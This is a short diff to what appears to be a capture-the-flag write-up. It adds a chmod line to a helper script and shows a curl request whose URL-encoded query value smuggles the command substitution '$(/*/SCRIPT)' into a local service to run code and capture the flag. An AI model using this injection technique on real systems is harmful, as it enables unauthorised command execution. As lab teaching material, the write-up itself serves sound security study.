@@ -47,6 +47,8 @@ So we make a script in /tmp/SCRIPT :
 
 getflag > /tmp/flag
 
+chmod 777 /tmp/SCRIPT
+
 And now we can call : curl "localhost:4646?x=%24%28%2F*%2FSCRIPT%29&y=yes"
 
 %24%28%2F*%2FSCRIPT%29 will be interpreted as $(/*/SCRIPT)
